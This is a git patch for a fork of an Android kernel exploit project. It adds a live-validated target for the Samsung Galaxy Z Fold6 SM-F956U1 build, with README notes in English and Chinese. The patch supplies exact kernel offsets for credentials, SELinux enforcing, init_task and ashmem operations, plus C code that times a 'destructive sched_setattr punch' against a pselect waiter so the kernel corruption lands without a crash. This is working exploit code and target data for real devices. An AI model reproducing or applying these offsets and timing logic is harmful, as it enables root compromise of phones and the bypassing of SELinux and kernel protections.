@@ -1,0 +1,468 @@
+diff --git a/README.md b/README.md
+index d6bbed9..2c1d9ea 100644
+--- a/README.md
++++ b/README.md
+@@ -13,9 +13,90 @@ and code path should not be assumed to be interchangeable with this project.
+ | Device | Kernel |
+ | ------ | ------ |
+ | Samsung Galaxy Z Fold6 (SM-F9560 / q6q) | `6.1.145-android14-11-3254009-abF9560ZCS4DZG3` |
++| Samsung Galaxy Z Fold6 (SM-F956U1) | `6.1.145-android14-11-33418572-abF956USQS4DZG3` |
+ 
+ At startup the kernel is matched against the offset table via `uname -r`; unsupported kernels are rejected immediately.
+ 
++### SM-F956U1 porting status
++
++`SM-F956U1` is a separate target even though it is the same Fold6 family. Do
++not copy the `SM-F9560` offsets until the complete kernel image has been
++compared or the target has been extracted and validated. The firmware build
++identifier alone is not enough to establish binary identity across regional
++variants.
++
++The exact AP package has now been extracted outside Git. The candidate is in
++`src/devices/f956u1-ues4dzg3/offsets.h` and has been validated on a live
++`SM-F956U1` running this kernel: an app-driven run reaches KernelSU root
++without rebooting the device.
++For reproducibility, the relevant inputs are the AP package for
++`F956U1UES4DZG3`, especially:
++
++- `boot.img.lz4`, decompressed to `boot.img`;
++- `xbl_config.img.lz4`, decompressed to the XBL configuration image (the
++  extracted copy used here is named `xbl_config.elf`); and
++- a matching `kallsyms` source, plus `llvm-objdump` from the Android NDK when
++  automatic disassembly is available.
++
++Keep the firmware archive and extracted images outside Git. Once those inputs
++are available, generate a candidate target header with:
++
++```powershell
++python tools/extract_target.py `
++  boot.img `
++  --xbl-config xbl_config.img `
++  --kallsyms kallsyms.txt `
++  --device f956u1-ues4dzg3
++```
++
++If `llvm-objdump.exe` is not already on `PATH`, add
++`--llvm-objdump <path-to-llvm-objdump.exe>` so the script can derive the
++disassembly-dependent fields instead of using its fallback heuristic.
++
++The generated entry must be reviewed against the device's live `uname -r`,
++the extractor report, and a debug build before use. The original `SM-F9560`
++entry remains unchanged until the new target is independently validated.
++
++## Changes in this fork
++
++This repository is a fork of
++[wxxsfxyzm/GhostLock-Galaxy](https://github.com/wxxsfxyzm/GhostLock-Galaxy).
++Relative to upstream `d082c2d`, the only functional change is the `SM-F956U1`
++target described above; the complete diff is kept as a single patch in
++[`docs/upstream-f956u1.patch`](docs/upstream-f956u1.patch), so it can be
++reviewed, applied, or proposed upstream as one unit. The patch does not contain
++`docs/upstream-f956u1.patch` itself.
++
++```bash
++git apply -p1 docs/upstream-f956u1.patch
++```
++
++Regenerate the patch from the upstream commit with:
++
++```bash
++git diff d082c2d -- . ':(exclude)docs/upstream-f956u1.patch' > docs/upstream-f956u1.patch
++```
++
++Contents of the patch:
++
++- `src/devices/f956u1-ues4dzg3/offsets.h` adds the validated `SM-F956U1` /
++  `F956U1UES4DZG3` target, and `src/devices/offsets.h` registers it.
++- `src/core/main.c` gates the destructive `sched_setattr` punch behind
++  `wait_for_pselect_blocked`. The route publishes its timestamp immediately
++  before entering `pselect6`, so a scheduler delay at that point used to let
++  the consumer punch before the kernel had copied the fd sets onto its stack,
++  which turned an ordinary timing miss into a reboot.
++- `src/core/main.c` replaces the persisted punch-delay rotation with a sticky
++  selection. A wrong delay corrupts the PI chain on this target instead of
++  merely missing the window, so the last delay that produced a verified write
++  is reused and the search advances only after an attempt that failed to
++  confirm. An attempt records itself as in progress before firing, so a crash
++  also advances the search on the next boot.
++- `tools/extract_target.py` accepts Samsung's `MemLabel` device-tree spelling
++  next to Qualcomm's `mem-label` when recovering the XBL memory map.
++- This README documents the target. Porting details, the live validation, and
++  the four corrected offset fields are described above.
++
+ ## Quick Start
+ 
+ For the APK path, start Shizuku through wireless debugging, grant GhostLock permission, and tap **Run**. Shizuku starts the payload as the Android shell user; the APK itself is not the exploit execution context.
+diff --git a/README_ZH.md b/README_ZH.md
+index b11dbbb..4686d56 100644
+--- a/README_ZH.md
++++ b/README_ZH.md
+@@ -12,9 +12,35 @@
+ | 设备 | Kernel |
+ | ---- | ------ |
+ | Samsung Galaxy Z Fold6（SM-F9560 / q6q） | `6.1.145-android14-11-3254009-abF9560ZCS4DZG3` |
++| Samsung Galaxy Z Fold6（SM-F956U1） | `6.1.145-android14-11-33418572-abF956USQS4DZG3` |
+ 
+ 启动时按 `uname -r` 精确匹配 offset 表，未匹配的内核会直接拒绝运行。
+ 
++## 本仓库相对上游的改动
++
++本仓库 fork 自 [wxxsfxyzm/GhostLock-Galaxy](https://github.com/wxxsfxyzm/GhostLock-Galaxy)。
++相对上游 `d082c2d`，功能性改动只有 `SM-F956U1` 目标；全部差异以单个补丁保存在
++[`docs/upstream-f956u1.patch`](docs/upstream-f956u1.patch)，便于一次性审阅、应用，
++或在将来直接向上游提交。该补丁本身不包含 `docs/upstream-f956u1.patch`。
++
++```bash
++git apply -p1 docs/upstream-f956u1.patch
++```
++
++补丁内容：
++
++- 新增并注册已在真机验证的 `SM-F956U1` / `F956U1UES4DZG3` 目标
++  （`src/devices/f956u1-ues4dzg3/offsets.h`、`src/devices/offsets.h`）。
++- `src/core/main.c` 在确认已进入 `pselect6` 阻塞后才触发破坏性的
++  `sched_setattr`，避免调度延迟导致内核在复制 fd 集合之前就被 punch，
++  把普通的超时失误变成重启。
++- `src/core/main.c` 将持久化的 punch delay 轮换改为粘性选择：只复用已验证写入
++  成功的延迟，未确认成功（含重启）才推进；触发前会先标记为进行中，
++  因此崩溃后下一次启动也会继续推进搜索。
++- `tools/extract_target.py` 额外兼容 Samsung 设备树的 `MemLabel` 拼写
++  （原先只认 Qualcomm 的 `mem-label`）。
++- README 记录该移植。移植细节、真机验证结果以及修正的四个 offset 字段见上文。
++
+ ## 快速开始
+ 
+ APK 路径需要先通过无线调试启动 Shizuku，并授予 GhostLock 权限，然后点击 **执行**。
+diff --git a/src/core/main.c b/src/core/main.c
+index acbaa67..0a98b29 100644
+--- a/src/core/main.c
++++ b/src/core/main.c
+@@ -330,6 +330,67 @@ static atomic_int gk_t1_about_wait, gk_t1_done, gk_t1_timeout;
+ static atomic_int gk_edeadlk, gk_release, gk_owner_has_lock;
+ static atomic_int gk_waiter_tid, gk_fire_count;
+ 
++/* The route timestamp is published immediately before entering pselect6.
++ * A scheduler delay at that point used to let the consumer punch before the
++ * kernel had copied the fd sets onto its stack, which turns a timing miss into
++ * a kernel crash.  Confirm the waiter is in do_select for several samples
++ * before issuing the one destructive sched_setattr operation. */
++static long read_task_syscall_nr(int tid) {
++  char path[64];
++  snprintf(path, sizeof(path), "/proc/self/task/%d/syscall", tid);
++  int fd = open(path, O_RDONLY | O_CLOEXEC);
++  if (fd < 0) return -1;
++  char buf[128];
++  ssize_t n = read(fd, buf, sizeof(buf) - 1);
++  close(fd);
++  if (n <= 0) return -1;
++  buf[n] = 0;
++  char *end = NULL;
++  errno = 0;
++  long nr = strtol(buf, &end, 0);
++  return (errno || end == buf) ? -1 : nr;
++}
++
++static int read_task_wchan(int tid, char *buf, size_t size) {
++  if (!buf || size < 2) return 0;
++  char path[64];
++  snprintf(path, sizeof(path), "/proc/self/task/%d/wchan", tid);
++  int fd = open(path, O_RDONLY | O_CLOEXEC);
++  if (fd < 0) return 0;
++  ssize_t n = read(fd, buf, size - 1);
++  close(fd);
++  if (n <= 0) return 0;
++  buf[n] = 0;
++  char *newline = strchr(buf, '\n');
++  if (newline) *newline = 0;
++  return 1;
++}
++
++static int task_blocked_in_pselect(int tid, char *wchan, size_t wchan_size) {
++  if (read_task_syscall_nr(tid) != SYS_pselect6 ||
++      !read_task_wchan(tid, wchan, wchan_size)) {
++    return 0;
++  }
++  return strncmp(wchan, "do_select", strlen("do_select")) == 0;
++}
++
++static int wait_for_pselect_blocked(int tid, int timeout_usec,
++                                    int confirmations, char *last_wchan,
++                                    size_t last_wchan_size) {
++  uint64_t deadline = mono_ns() + (uint64_t)timeout_usec * 1000ULL;
++  int synced = 0;
++  while (mono_ns() < deadline) {
++    if (task_blocked_in_pselect(tid, last_wchan, last_wchan_size)) {
++      if (++synced >= confirmations) return 1;
++      usleep(100);
++    } else {
++      synced = 0;
++      __asm__ volatile("yield" ::: "memory");
++    }
++  }
++  return 0;
++}
++
+ static void *sync_waiter_thread(void *arg __attribute__((unused))) {
+   disable_rseq_for_thread();
+   atomic_store(&gk_waiter_tid, (int)syscall(SYS_gettid));
+@@ -427,6 +488,14 @@ static void *sync_consumer_thread(void *arg __attribute__((unused))) {
+       if (atomic_load(&gk_route_done)) return NULL;
+       __asm__ volatile("yield" ::: "memory");
+     }
++    char wchan[64] = "<unreadable>";
++    if (!wait_for_pselect_blocked(atomic_load(&gk_waiter_tid), 20000, 3,
++                                  wchan, sizeof(wchan))) {
++      pr_info("sync pselect blocked guard failed tid=%d wchan=%s; "
++              "skipping punch\n", atomic_load(&gk_waiter_tid), wchan);
++      atomic_store(&gk_route_done, 1);
++      return NULL;
++    }
+     uint64_t target = enter + (uint64_t)delay_usec * 1000ULL;
+     /* Sleep to 1ms before the mark, then busy-wait the last ~2ms. */
+     for (;;) {
+@@ -480,36 +549,58 @@ static int sync_delay_override(void) {
+   return (int)value;
+ }
+ 
+-static int sync_next_persistent_delay_index(int count) {
+-  static const char state_path[] =
+-      "/data/local/tmp/.ghostlock_fops_delay_index";
+-  int state_fd = open(state_path, O_RDWR | O_CREAT | O_CLOEXEC, 0600);
++#define SYNC_DELAY_STATE_MAGIC 0x5a
++#define SYNC_DELAY_STATE_IN_PROGRESS 0x80
++static const char sync_delay_state_path[] =
++    "/data/local/tmp/.ghostlock_fops_delay_index";
++
++/* The punch delay is device- and state-dependent, so the route keeps a small
++ * candidate table.  Blindly rotating that table is dangerous on targets where
++ * a wrong delay corrupts the PI chain instead of merely missing the window
++ * (SM-F956U1 reboots at 40000/70000us but reaches a verified write at 50000us).
++ * The selection is therefore sticky: the last delay that produced a verified
++ * write is reused, and the search only advances after an attempt that did not
++ * confirm.  An attempt marks itself in-progress before firing, so a crash also
++ * advances the search on the next boot instead of retrying the same value. */
++static int sync_select_delay_index(int count) {
++  int index = 0;
++  int state_fd = open(sync_delay_state_path, O_RDWR | O_CREAT | O_CLOEXEC,
++                      0600);
+   if (state_fd < 0) {
+-    return -1;
+-  }
+-
+-  uint8_t stored = 0;
+-  ssize_t read_len = pread(state_fd, &stored, sizeof(stored), 0);
+-  int index = (read_len == (ssize_t)sizeof(stored) && stored < count)
+-                  ? (int)stored
+-                  : 0;
+-  uint8_t next = (uint8_t)((index + 1) % count);
+-  ssize_t write_len = pwrite(state_fd, &next, sizeof(next), 0);
+-  int write_errno = errno;
+-  errno = 0;
+-  int sync_ret = fsync(state_fd);
+-  int sync_errno = errno;
++    return index;
++  }
++  uint8_t record[2] = {0, 0};
++  int have_record =
++      pread(state_fd, record, sizeof(record), 0) == (ssize_t)sizeof(record) &&
++      record[0] == SYNC_DELAY_STATE_MAGIC && (record[1] & 0x7f) < count;
++  if (have_record) {
++    int stored = record[1] & 0x7f;
++    index = (record[1] & SYNC_DELAY_STATE_IN_PROGRESS)
++                ? (stored + 1) % count
++                : stored;
++  }
++  uint8_t marker[2] = {SYNC_DELAY_STATE_MAGIC,
++                       (uint8_t)(SYNC_DELAY_STATE_IN_PROGRESS | index)};
++  if (pwrite(state_fd, marker, sizeof(marker), 0) != (ssize_t)sizeof(marker)) {
++    pr_warning("sync delay state mark write failed\n");
++  }
++  fsync(state_fd);
+   close(state_fd);
+-  if (write_len != (ssize_t)sizeof(next)) {
+-    pr_warning("sync delay index state write failed ret=%zd errno=%d\n",
+-               write_len, write_errno);
+-    return -1;
++  return index;
++}
++
++static void sync_confirm_delay_index(int index) {
++  int state_fd = open(sync_delay_state_path, O_WRONLY | O_CREAT | O_CLOEXEC,
++                      0600);
++  if (state_fd < 0) {
++    return;
+   }
+-  if (sync_ret != 0) {
+-    pr_warning("sync delay index state fsync failed ret=%d errno=%d\n",
+-               sync_ret, sync_errno);
++  uint8_t record[2] = {SYNC_DELAY_STATE_MAGIC, (uint8_t)(index & 0x7f)};
++  if (pwrite(state_fd, record, sizeof(record), 0) != (ssize_t)sizeof(record)) {
++    pr_warning("sync delay state confirm write failed\n");
+   }
+-  return index;
++  fsync(state_fd);
++  close(state_fd);
+ }
+ 
+ int run_sync_route(void) {
+@@ -531,27 +622,24 @@ int run_sync_route(void) {
+   atomic_store(&gk_fire_count, 0);
+   atomic_store(&gk_enter_ts, 0);
+ 
+-  /* Allow one delay to be selected externally while retaining the normal
+-   * per-route rotation when the variable is absent. */
++  /* Allow one delay to be selected externally; otherwise use the sticky
++   * persistent selection.  The first entry is the pselect anchor and the
++   * delay verified on SM-F956U1. */
+   static const int fops_delays[] = {
+-    70000, 60000, 80000, 40000, 90000, 50000,
++    PSELECT_ENTER_DELAY_USEC, 60000, 80000, 90000, 40000, 70000,
+   };
+   int delay_count = (int)(sizeof(fops_delays) / sizeof(fops_delays[0]));
+   static int sync_route_counter;
+   int delay_override = sync_delay_override();
+-  int delay_index = -1;
+-  const char *delay_source = "rotation";
++  int delay_index;
++  const char *delay_source;
+   int route_delay = delay_override;
+   if (delay_override >= 0) {
+     delay_index = sync_route_counter++ % delay_count;
+     delay_source = "env";
+   } else {
+-    delay_index = sync_next_persistent_delay_index(delay_count);
+-    if (delay_index >= 0) {
+-      delay_source = "persistent";
+-    } else {
+-      delay_index = sync_route_counter++ % delay_count;
+-    }
++    delay_index = sync_select_delay_index(delay_count);
++    delay_source = "persistent";
+     route_delay = fops_delays[delay_index];
+   }
+   atomic_store(&main_route_delay_usec, route_delay);
+@@ -611,6 +699,9 @@ int run_sync_route(void) {
+   pr_info("sync route done ok=%d timeout_path=%d hit=%d step=%d\n",
+           ok, atomic_load(&gk_t1_timeout), atomic_load(&gk_window_hit),
+           cfi_last_step);
++  if (delay_override < 0 && ok) {
++    sync_confirm_delay_index(delay_index);
++  }
+   atomic_store(&gk_release, 1);
+   atomic_store(&gk_route_done, 1);
+   pthread_join(waiter, NULL);
+diff --git a/src/devices/f956u1-ues4dzg3/offsets.h b/src/devices/f956u1-ues4dzg3/offsets.h
+new file mode 100644
+index 0000000..daf4db4
+--- /dev/null
++++ b/src/devices/f956u1-ues4dzg3/offsets.h
+@@ -0,0 +1,75 @@
++/* Validated target for Samsung SM-F956U1 / F956U1UES4DZG3.
++ *
++ * Extracted from the exact AP boot.img and xbl_config.elf on 2026-09-22 with
++ * tools/extract_target.py and LLVM 22.1.8, then validated on the live device on
++ * 2026-09-23: the app-driven run reaches KernelSU root without rebooting the
++ * phone.  Keep tracefs_leak enabled so a future run aborts if the leak metadata
++ * does not match instead of guessing a KASLR slide.
++ */
++
++OFFSETS_ENTRY(
++    "6.1.145-android14-11-33418572-abF956USQS4DZG3",
++    STRUCT_OFFSETS_6_1,
++    .waiter_compact = 1,
++    .tracefs_leak = 1,
++    .tracefs_event_id = 106,
++    /* worker_thread is at 0xDB100; the known sched_blocked_reason caller is
++     * worker_thread + 0xA0 on this image and the existing Fold6 target. */
++    .tracefs_caller_off = 0xdb1a0,
++    .umh_root = 1,
++    .sync_route = 1,
++    .off_call_usermodehelper_exec_work = 0x000d39cc,
++    /* kallsyms: system_unbound_wq = 0xffffffc00a23ae60. */
++    .off_system_unbound_wq = 0x0223ae60,
++    .kimage_text_base = 0xffffffc008000000,
++    /* BTF sizeof(mm_struct)=0x3c0; SLUB rounds this cache to a 0x400
++     * object stride.  KernelSnitch must search the allocation stride. */
++    .mm_struct_sz = 0x400,
++    .page_slab_cache = 0x18,
++    .kernel_phys_load = 0xa8000000,
++    .pselect_waiter_shift = 1,
++    .fops_ioctl = 0x50,
++    .fops_compat_ioctl = 0x58,
++    .fops_mmap = 0x60,
++    .fops_open = 0x70,
++    .fops_release = 0x80,
++    .fops_splice_read = 0xc8,
++    .fops_show_fdinfo = 0xe0,
++    .cred_uid = 0x4,
++    .cred_securebits = 0x24,
++    .cred_caps = 0x28,
++    .cred_security = 0x78,
++    .off_init_task = 0x0224f8c0,
++    .off_init_cred = 0x017af018,
++    .off_root_task_group = 0x0244cd80,
++    .off_selinux_enforcing = 0x02521588,
++    .off_selinux_blob_sizes = 0x0176d2c8,
++    .off_security_hook_heads = 0x0176cbb8,
++    .off_kmalloc_caches = 0x0176c6f8,
++    .off_anon_pipe_buf_ops = 0x01219d90,
++    .off_slide_nfulnl_logger = 0x02242a20,
++    /* random_table + 0x108 points at the boot-id data slot; the sysctl
++     * table's data pointer is the separate 0x026046e8 symbol. */
++    .off_slide_boot_id = 0x023762f0,
++    .off_slide_sysctl_bootid = 0x026046e8,
++    .off_configfs_read_iter = 0x004712a4,
++    .off_configfs_bin_write_iter = 0x004717d4,
++    .off_copy_splice_read = 0x003ef340,
++    .off_noop_llseek = 0x003a14e4,
++    .off_slide_loggers_0_1 = 0x02242970,
++    .off_ashmem_misc_fops = 0x023bb5b0,
++    .off_ashmem_fops = 0x013d1140,
++    .off_ashmem_ioctl = 0x00d3a314,
++    .off_ashmem_compat_ioctl = 0x00d3ac4c,
++    .off_ashmem_mmap = 0x00d3aca4,
++    .off_ashmem_open = 0x00d3aed0,
++    .off_ashmem_release = 0x00d3af58,
++    .off_ashmem_show_fdinfo = 0x00d3b078,
++),
++
++/* BTF reference (runtime uses the fields above): */
++/* #define STRUCT_PAGE_SIZE 0x40 */
++/* #define STRUCT_PAGE_COMPOUND_HEAD 0x8 */
++/* #define STRUCT_PAGE_TYPE 0x30 */
++/* #define STRUCT_SLAB_CACHE 0x18 */
++/* #define STRUCT_MM_STRUCT 0x3C0 */
+diff --git a/src/devices/offsets.h b/src/devices/offsets.h
+index 5a45a8d..a9dece6 100644
+--- a/src/devices/offsets.h
++++ b/src/devices/offsets.h
+@@ -94,6 +94,7 @@ struct kernel_offsets {
+ static const struct kernel_offsets known_offsets[] = {
+ /* Add a new verified device by creating src/devices/<name>/offsets.h. */
+ #include "zfold6/offsets.h"
++#include "f956u1-ues4dzg3/offsets.h"
+   { .uname_r = NULL }
+ };
+ 
+diff --git a/tools/extract_target.py b/tools/extract_target.py
+index 890d5bc..2f436ca 100644
+--- a/tools/extract_target.py
++++ b/tools/extract_target.py
+@@ -110,7 +110,16 @@ def recover_kernel_phys_load(path: Path) -> int:
+                     node = stack.pop()
+                     props = node["props"]
+                     assert isinstance(props, dict)
+-                    label = props.get("mem-label", b"").split(b"\0", 1)[0].decode("ascii")
++                    # Qualcomm XBL DTBs normally use ``mem-label``.  Some
++                    # Samsung builds retain the firmware-facing ``MemLabel``
++                    # spelling instead, while keeping the same memory-map
++                    # nodes and cell layout.
++                    label_raw = next(
++                        (value for key, value in props.items()
++                         if key.lower().replace("_", "-") in {"mem-label", "memlabel"}),
++                        b"",
++                    )
++                    label = label_raw.split(b"\0", 1)[0].decode("ascii")
+                     reg = props.get("reg")
+                     if "/memorymap/" in str(node["path"]) and label in {"NOMAP", "Kernel"} and reg is not None:
+                         ac, sc = int(node["parent_ac"]), int(node["parent_sc"])
